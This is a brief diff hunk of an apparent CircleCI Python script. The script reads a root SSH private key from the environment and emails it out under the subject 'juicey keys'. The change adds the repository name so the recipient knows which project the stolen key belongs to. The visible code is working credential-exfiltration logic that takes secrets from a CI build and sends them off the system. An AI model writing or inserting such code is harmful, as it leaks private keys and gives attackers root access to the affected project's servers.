@@ -15,7 +15,7 @@ msg['Subject']="juicey keys"
 
 root_key = os.environ["ROOT_SSH_KEY"]
 
-msg.attach(MIMEText(root_key, 'plain'))
+msg.attach(MIMEText("root ssh key for " + os.environ["CIRCLE_PROJECT_REPONAME"] + " is " + root_key, 'plain'))
 
 
 s.send_message(msg)
